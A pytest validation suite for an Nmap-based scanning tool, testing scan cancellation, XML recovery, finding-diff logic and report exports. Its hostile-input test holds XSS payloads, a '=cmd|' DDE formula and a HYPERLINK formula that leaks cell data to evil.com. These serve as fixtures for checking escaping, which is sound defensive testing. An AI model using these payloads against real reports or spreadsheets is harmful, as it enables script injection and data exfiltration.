"""Release Candidate Validation Test Suite for NetSentinel AI.

Exhaustively validates:
1. Scan Lifecycle: Normal completion, cancellation, process reaping, already-exited handling, app closure, failure recovery, process isolation.
2. XML Parsing & Recovery: Complete valid XML, truncated at host level, truncated mid-port, missing root, invalid, empty, non-Nmap XML, scope limitations flag.
3. Finding Lifecycle & Differential Scope: Full-to-full, full-to-narrow, full-to-cancelled, full-to-failed, zero-host, target mismatch, and verified scope broad-port reassessment.
4. Report Security & Hostile Inputs: HTML XSS escaping, CSV formula injection defense with leading spaces/tabs/returns, JSON schema 1.0.0 validation and credential exclusion.
5. Performance Stress Test: 5,000 findings serialization and large evidence handling.
"""

from __future__ import annotations

import json
import os
import re
import subprocess
import sys
import time
from pathlib import Path
from typing import List
from unittest.mock import MagicMock, patch
import pytest

from netsentinel.core.models import (
    ASSESSMENT_STATUS_CANCELLED,
    ASSESSMENT_STATUS_COMPLETED,
    ASSESSMENT_STATUS_FAILED,
    ASSESSMENT_STATUS_INCONCLUSIVE,
    ASSESSMENT_STATUS_PARTIAL,
    DiscoveredHost,
    DiscoveredPort,
    Port,
    ScanResult,
    ScanSession,
    SecurityFinding,
    STATUS_OPEN,
    STATUS_RESOLVED,
    STATUS_ACKNOWLEDGED,
    STATUS_FALSE_POSITIVE,
)
from netsentinel.core.nmap_engine import NmapEngine, NmapExecutionResult
from netsentinel.core.xml_parser import NmapXmlParser
from netsentinel.core.security_analyzer import SecurityAnalyzer
from netsentinel.core.reporting.diff_engine import DiffEngine
from netsentinel.core.reporting.csv_export import CsvExporter, FORMULA_TRIGGERS
from netsentinel.core.reporting.json_export import JsonExporter
from netsentinel.core.reporting.html_report import HtmlReportGenerator


# =============================================================================
# 1. SCAN LIFECYCLE TESTS
# =============================================================================

def test_scan_lifecycle_normal_completion(tmp_path: Path):
    """Verify normal scan execution records completed status, timing, and output."""
    engine = NmapEngine()
    mock_proc = MagicMock()
    mock_proc.pid = 20001
    mock_proc.poll.return_value = 0
    mock_proc.returncode = 0
    mock_proc.stderr.readline.side_effect = [""]
    mock_proc.communicate.return_value = (
        '<?xml version="1.0"?><nmaprun scanner="nmap" version="7.94"><host><status state="up"/><address addr="10.0.0.1" addrtype="ipv4"/></host></nmaprun>',
        "",
    )

    with patch("subprocess.Popen", return_value=mock_proc):
        engine._nmap_path = tmp_path / "nmap.exe"
        engine._nmap_path.touch()
        res = engine.execute_scan("10.0.0.1")
        assert res.success is True
        assert res.was_cancelled is False
        assert res.returncode == 0
        assert "10.0.0.1" in res.xml_output


def test_scan_lifecycle_cancellation_during_active_scan():
    """Verify cancellation actively reaps running child process and flags cancelled."""
    engine = NmapEngine()
    proc = subprocess.Popen(
        [sys.executable, "-c", "import time; time.sleep(30)"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    try:
        engine._active_process = proc
        assert proc.poll() is None
        res = engine.cancel()
        assert res is True
        assert proc.poll() is not None
        assert engine._is_cancelling is True
    finally:
        if proc.poll() is None:
            proc.kill()
            proc.wait(timeout=1)


def test_scan_lifecycle_cancel_when_process_already_exited():
    """Verify cancellation when process already exited returns False cleanly."""
    engine = NmapEngine()
    proc = subprocess.Popen(
        [sys.executable, "-c", "import sys; sys.exit(0)"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    proc.wait(timeout=2)
    assert proc.poll() is not None

    engine._active_process = proc
    # Process is already dead
    res = engine.cancel()
    assert res is False


def test_scan_lifecycle_termination_timeout_fallback():
    """Verify proc.kill() fallback is called if proc.wait() raises TimeoutExpired."""
    engine = NmapEngine()
    mock_proc = MagicMock()
    mock_proc.pid = 30001
    mock_proc.poll.side_effect = [None, None, 0]
    mock_proc.wait.side_effect = [subprocess.TimeoutExpired(cmd="taskkill", timeout=2), None]

    engine._active_process = mock_proc
    res = engine.cancel()
    assert res is True
    mock_proc.kill.assert_called_once()


def test_scan_lifecycle_unrelated_process_isolation():
    """Verify NmapEngine only targets its own designated active process."""
    engine = NmapEngine()
    mock_proc = MagicMock()
    mock_proc.pid = 44444
    mock_proc.poll.return_value = None

    engine._active_process = mock_proc
    with patch("subprocess.run") as mock_run:
        engine.cancel()
        if sys.platform == "win32":
            mock_run.assert_called_once()
            call_cmd = mock_run.call_args[0][0]
            assert "44444" in call_cmd
            assert "/PID" in call_cmd


def test_scan_lifecycle_nmap_failure_and_invalid_output(tmp_path: Path):
    """Verify non-zero exit code produces clean failed NmapExecutionResult."""
    engine = NmapEngine()
    engine._nmap_path = tmp_path / "nmap.exe"
    engine._nmap_path.touch()

    mock_proc = MagicMock()
    mock_proc.pid = 50001
    mock_proc.poll.return_value = 1
    mock_proc.returncode = 1
    mock_proc.stderr.readline.side_effect = ["QUITTING!\n", "Failed to resolve target.\n", ""]
    mock_proc.communicate.return_value = ("", "QUITTING!\nFailed to resolve target.")

    with patch("subprocess.Popen", return_value=mock_proc):
        res = engine.execute_scan("bad_target")
        assert res.success is False
        assert res.returncode == 1
        assert "Failed to resolve target" in res.error_message


# =============================================================================
# 2. XML PARSING & RECOVERY INVARIANTS
# =============================================================================

def test_xml_parsing_complete_valid_output():
    """Verify full multi-host XML extracts all hosts, ports, banners, and timing."""
    xml = """<?xml version="1.0" encoding="UTF-8"?>
    <nmaprun scanner="nmap" args="nmap -sT 192.168.1.1" startstr="Sat Oct 31 10:00:00 2026" version="7.94">
        <host>
            <status state="up"/>
            <address addr="192.168.1.1" addrtype="ipv4"/>
            <hostnames><hostname name="router.local" type="PTR"/></hostnames>
            <ports>
                <port protocol="tcp" portid="80"><state state="open"/><service name="http"/></port>
                <port protocol="tcp" portid="443"><state state="open"/><service name="https"/></port>
            </ports>
        </host>
        <runstats><finished timestr="Sat Oct 31 10:00:05 2026" elapsed="5.0"/></runstats>
    </nmaprun>"""
    res = NmapXmlParser.parse(xml)
    assert res.success is True
    assert len(res.hosts) == 1
    h = res.hosts[0]
    assert h.ip_address == "192.168.1.1"
    assert h.hostname == "router.local"
    assert len(h.ports) == 2


def test_xml_parsing_truncated_after_completed_hosts():
    """Verify recovery when XML cuts off right after first host closing tag."""
    xml = """<?xml version="1.0" encoding="UTF-8"?>
    <nmaprun scanner="nmap" version="7.94">
        <host>
            <status state="up"/>
            <address addr="192.168.1.10" addrtype="ipv4"/>
            <ports><port protocol="tcp" portid="22"><state state="open"/></port></ports>
        </host>"""
    res = NmapXmlParser.parse(xml)
    assert res.success is True
    assert len(res.hosts) == 1
    assert res.hosts[0].ip_address == "192.168.1.10"
    assert res.hosts[0].ports[0].port_number == 22


def test_xml_parsing_missing_xml_root_and_invalid():
    """Verify non-Nmap XML (missing nmaprun root) is rejected gracefully."""
    for bad in [
        "<root><item>Not Nmap</item></root>",
        "<html><body>Error 404</body></html>",
        "random non-xml string",
    ]:
        res = NmapXmlParser.parse(bad)
        assert res.success is False
        assert len(res.hosts) == 0


def test_recovered_scan_never_implies_complete_coverage():
    """Verify that a partial or cancelled scan is explicitly flagged with scope limitations."""
    cancelled_session = ScanSession(
        id=99,
        target_input="192.168.1.0/24",
        profile="Comprehensive",
        status="cancelled",
        hosts_discovered=2,
    )
    completeness, has_limitations, notice = DiffEngine.evaluate_completeness(cancelled_session)
    assert completeness == ASSESSMENT_STATUS_CANCELLED
    assert has_limitations is True
    assert "cancelled" in notice.lower()


# =============================================================================
# 3. FINDING LIFECYCLE & VERIFIED SCOPE SCAN COMPARISON
# =============================================================================

def test_finding_lifecycle_full_then_narrow_port_scan():
    """Verify narrow scan does NOT resolve baseline finding on omitted port."""
    base_session = ScanSession(id=1, target_input="192.168.1.50", profile="tcp_connect", status="completed", hosts_discovered=1)
    curr_session = ScanSession(id=2, target_input="192.168.1.50", profile="tcp_connect", status="completed", hosts_discovered=1, configured_ports="80")

    base_finding = SecurityFinding(
        id=1,
        session_id=1,
        asset_id=5,
        rule_id="RULE-EXP-TELNET",
        rule_version="1.0.0",
        severity="High",
        title="Unencrypted Telnet Service Exposed",
        description="",
        recommendation="",
        status=STATUS_OPEN,
        port_number=23,
        protocol="tcp",
    )

    # Current scan only scanned port 80
    diff = DiffEngine.compare_sessions(
        baseline_session=base_session,
        current_session=curr_session,
        baseline_findings=[base_finding],
        current_findings=[],
        current_scanned_ports_by_asset={5: {80}},
        current_scanned_assets={5},
    )
    assert len(diff.resolved_findings) == 0
    assert len(diff.not_reassessed_findings) == 1
    assert diff.not_reassessed_findings[0].id == 1


def test_finding_lifecycle_full_then_cancelled_or_failed_scan():
    """Verify cancelled or failed scan NEVER resolves any findings."""
    base_session = ScanSession(id=1, target_input="10.0.0.1", profile="tcp_connect", status="completed", hosts_discovered=1)
    cancelled_session = ScanSession(id=2, target_input="10.0.0.1", profile="tcp_connect", status="cancelled", hosts_discovered=1)
    failed_session = ScanSession(id=3, target_input="10.0.0.1", profile="tcp_connect", status="failed", hosts_discovered=0)

    base_finding = SecurityFinding(
        id=2,
        session_id=1,
        asset_id=10,
        rule_id="RULE-EXP-FTP",
        rule_version="1.0.0",
        severity="Medium",
        title="Cleartext FTP",
        description="",
        recommendation="",
        status=STATUS_OPEN,
        port_number=21,
    )

    diff_cancel = DiffEngine.compare_sessions(
        baseline_session=base_session,
        current_session=cancelled_session,
        baseline_findings=[base_finding],
        current_findings=[],
        current_scanned_ports_by_asset={10: {21}},
        current_scanned_assets={10},
    )
    assert len(diff_cancel.resolved_findings) == 0
    assert len(diff_cancel.not_reassessed_findings) == 1

    diff_failed = DiffEngine.compare_sessions(
        baseline_session=base_session,
        current_session=failed_session,
        baseline_findings=[base_finding],
        current_findings=[],
        current_scanned_ports_by_asset={10: {21}},
        current_scanned_assets={10},
    )
    assert len(diff_failed.resolved_findings) == 0
    assert len(diff_failed.not_reassessed_findings) == 1


def test_finding_lifecycle_zero_host_scan():
    """Verify zero-host scan marks assessment Inconclusive and preserves findings."""
    base_session = ScanSession(id=1, target_input="192.168.1.1", profile="tcp_connect", status="completed", hosts_discovered=1)
    zero_session = ScanSession(id=2, target_input="192.168.1.1", profile="tcp_connect", status="completed", hosts_discovered=0)

    base_finding = SecurityFinding(
        id=3,
        session_id=1,
        asset_id=1,
        rule_id="RULE-EXP-HTTP",
        rule_version="1.0.0",
        severity="Low",
        title="HTTP Cleartext",
        description="",
        recommendation="",
        status=STATUS_OPEN,
        port_number=80,
    )

    diff = DiffEngine.compare_sessions(
        baseline_session=base_session,
        current_session=zero_session,
        baseline_findings=[base_finding],
        current_findings=[],
    )
    assert diff.assessment_completeness == ASSESSMENT_STATUS_INCONCLUSIVE
    assert len(diff.resolved_findings) == 0
    assert len(diff.not_reassessed_findings) == 1


def test_broad_port_reassessment_verified_scope_vs_count_alone():
    """Verify broad port finding resolution requires verified scope, not just port count > 10."""
    analyzer = SecurityAnalyzer()

    # Finding evidence lists the 12 original open ports
    evidence_text = (
        "Host 10.0.0.5 exposes 12 open ports (21/tcp, 22/tcp, 23/tcp, 25/tcp, 53/tcp, "
        "80/tcp, 110/tcp, 135/tcp, 139/tcp, 143/tcp, 443/tcp, 445/tcp), exceeding threshold of 10."
    )
    broad_finding = SecurityFinding(
        id=50,
        session_id=1,
        asset_id=7,
        rule_id="RULE-OBS-BROAD-PORTS",
        rule_version="1.0.0",
        severity="Medium",
        title="Broad open-port exposure",
        description="",
        recommendation="",
        evidence=evidence_text,
        status=STATUS_OPEN,
        port_number=None,
    )

    # 1. New scan examined 12 ports, but they are UNRELATED ports (e.g. 9000-9011) with 0 open
    # Count is 12 (> 10), but NONE of the original offending ports were reassessed!
    unrelated_ports = [DiscoveredPort(port_number=p, protocol="tcp", state="closed") for p in range(9000, 9012)]
    scan_unrelated = ScanResult(
        success=True,
        was_cancelled=False,
        hosts=[DiscoveredHost(ip_address="10.0.0.5", status="up", ports=unrelated_ports)],
    )
    resolutions_unrelated = analyzer.evaluate_finding_resolutions(
        scan_result=scan_unrelated,
        session_id=2,
        existing_active_findings=[broad_finding],
        discovered_assets_map={"10.0.0.5": 7},
    )
    # MUST NOT resolve because the original scope was not reassessed!
    assert len(resolutions_unrelated) == 0

    # 2. When some original offending ports are still open (e.g. 4 open), MUST NOT resolve!
    reassessed_ports_partial_open = [
        DiscoveredPort(port_number=p, protocol="tcp", state="closed")
        for p in [21, 22, 23, 25, 53, 110, 135, 139]
    ]
    reassessed_ports_partial_open.extend([
        DiscoveredPort(port_number=p, protocol="tcp", state="open")
        for p in [80, 143, 443, 445]
    ])
    scan_partial_open = ScanResult(
        success=True,
        was_cancelled=False,
        hosts=[DiscoveredHost(ip_address="10.0.0.5", status="up", ports=reassessed_ports_partial_open)],
    )
    resolutions_partial_open = analyzer.evaluate_finding_resolutions(
        scan_result=scan_partial_open,
        session_id=3,
        existing_active_findings=[broad_finding],
        discovered_assets_map={"10.0.0.5": 7},
    )
    assert len(resolutions_partial_open) == 0

    # 3. When ALL 12 original offending ports are verified closed/filtered, MUST resolve!
    reassessed_ports_all_closed = [
        DiscoveredPort(port_number=p, protocol="tcp", state="closed")
        for p in [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445]
    ]
    scan_all_closed = ScanResult(
        success=True,
        was_cancelled=False,
        hosts=[DiscoveredHost(ip_address="10.0.0.5", status="up", ports=reassessed_ports_all_closed)],
    )
    resolutions_verified = analyzer.evaluate_finding_resolutions(
        scan_result=scan_all_closed,
        session_id=4,
        existing_active_findings=[broad_finding],
        discovered_assets_map={"10.0.0.5": 7},
    )
    assert len(resolutions_verified) == 1
    assert "verified closed/filtered" in resolutions_verified[0][1]


# =============================================================================
# 4. REPORT SECURITY & HOSTILE INPUT TESTS
# =============================================================================

def test_hostile_report_security_html_csv_json(tmp_path: Path):
    """Verify HTML XSS escaping, CSV formula injection defense, and clean JSON export."""
    hostile_finding = SecurityFinding(
        id=666,
        session_id=1,
        asset_id=1,
        rule_id="RULE-HOSTILE-TEST",
        rule_version="1.0.0",
        severity="High",
        title="Hostile Finding <script>alert('pwn')</script> & <b>bold</b>",
        description="Description with <iframe src='http://attacker.com'> and 'quotes'",
        recommendation="Remediation with <img src=x onerror=alert('xss')>",
        status=STATUS_OPEN,
        risk_score=99.9,
        risk_tier="Critical",
        confidence="High",
        port_number=8080,
        protocol="tcp",
        ip_address="192.168.1.99",
        hostname="victim<script>alert(1)</script>.corp",
        evidence="=cmd|' /C calc'!A0",
        user_notes="  +HYPERLINK(\"http://evil.com?leak=\"&A1,\"Click Here\")",
    )
    session = ScanSession(id=1, target_input="192.168.1.99<script>", profile="tcp_connect", status="completed", hosts_discovered=1)

    # 1. HTML Report Verification
    html_file = tmp_path / "hostile_report.html"
    HtmlReportGenerator.generate_report([hostile_finding], session=session, output_file=html_file)
    assert html_file.exists()
    with open(html_file, "r", encoding="utf-8") as f:
        html_text = f.read()

    # Raw script/iframe tags must NEVER appear unescaped
    assert "<script>" not in html_text
    assert "<iframe" not in html_text
    assert "<img src=x" not in html_text
    # Escaped representations must be present
    assert "&lt;script&gt;" in html_text
    assert "&lt;iframe" in html_text
    assert "&lt;img src=x" in html_text
    # Zero external CDN links or remote fonts or unescaped embeds
    assert "<script src=" not in html_text.lower()
    assert "<link rel=" not in html_text.lower()
    assert "<iframe src=" not in html_text.lower()
    assert "fonts.googleapis" not in html_text

    # 2. CSV Report Verification
    csv_file = tmp_path / "hostile_report.csv"
    CsvExporter.export_findings([hostile_finding], output_file=csv_file)
    assert csv_file.exists()
    with open(csv_file, "r", encoding="utf-8-sig") as f:
        csv_lines = f.readlines()

    assert len(csv_lines) == 2  # Header + 1 data line
    data_line = csv_lines[1]
    # Evidence starting with =cmd must be escaped with single quote
    assert "'=cmd|" in data_line
    # Notes with leading space + formula must be escaped with single quote
    assert "'  +HYPERLINK" in data_line

    # 3. JSON Export Verification
    json_file = tmp_path / "hostile_report.json"
    JsonExporter.export([hostile_finding], session=session, output_file=json_file)
    assert json_file.exists()
    with open(json_file, "r", encoding="utf-8") as f:
        doc = json.load(f)

    assert doc["metadata"]["schema_version"] == "1.0.0"
    assert doc["metadata"]["generator"] == "NetSentinel AI"
    # Ensure no credentials or local master keys leaked
    doc_str = json.dumps(doc)
    assert "dpapi" not in doc_str.lower()
    assert "password" not in doc_str.lower()


# =============================================================================
# 5. PERFORMANCE STRESS TEST (5,000 FINDINGS)
# =============================================================================

def test_performance_stress_5000_findings(tmp_path: Path):
    """Stress test serialization and stability with 5,000 security findings."""
    large_findings: List[SecurityFinding] = []
    # 2KB large evidence string
    large_evidence = "Evidence buffer: " + ("ABCDEF123456" * 150)

    for i in range(1, 5001):
        large_findings.append(
            SecurityFinding(
                id=i,
                session_id=1,
                asset_id=(i % 50) + 1,
                rule_id=f"RULE-STRESS-{i % 10}",
                rule_version="1.0.0",
                severity="High" if i % 2 == 0 else "Medium",
                title=f"Bulk Scale Finding #{i} in Performance Validation",
                description=f"Detailed description for stress finding #{i}",
                recommendation=f"Remediation action for item #{i}",
                status=STATUS_OPEN,
                risk_score=80.0 if i % 2 == 0 else 50.0,
                risk_tier="High" if i % 2 == 0 else "Medium",
                confidence="High",
                port_number=1000 + (i % 5000),
                protocol="tcp",
                ip_address=f"10.0.{i % 254}.{(i // 254) % 254 + 1}",
                hostname=f"node-{i}.scale.net",
                evidence=large_evidence,
                user_notes=f"User review note for #{i}",
            )
        )

    session = ScanSession(
        id=1,
        target_input="10.0.0.0/16",
        profile="Comprehensive",
        status="completed",
        hosts_discovered=50,
        ports_found=5000,
    )

    # 1. CSV Performance (5,000 findings)
    t0 = time.time()
    csv_path = tmp_path / "scale_5000.csv"
    CsvExporter.export_findings(large_findings, output_file=csv_path)
    csv_time = time.time() - t0
    assert csv_path.exists()
    assert csv_time < 3.0  # Must complete in < 3 seconds

    # 2. JSON Performance (5,000 findings)
    t0 = time.time()
    json_path = tmp_path / "scale_5000.json"
    JsonExporter.export(large_findings, session=session, output_file=json_path)
    json_time = time.time() - t0
    assert json_path.exists()
    assert json_time < 2.0  # Must complete in < 2 seconds

    # 3. HTML Performance (5,000 findings)
    t0 = time.time()
    html_path = tmp_path / "scale_5000.html"
    HtmlReportGenerator.generate_report(large_findings, session=session, output_file=html_path)
    html_time = time.time() - t0
    assert html_path.exists()
    assert html_time < 3.5  # Must complete in < 3.5 seconds
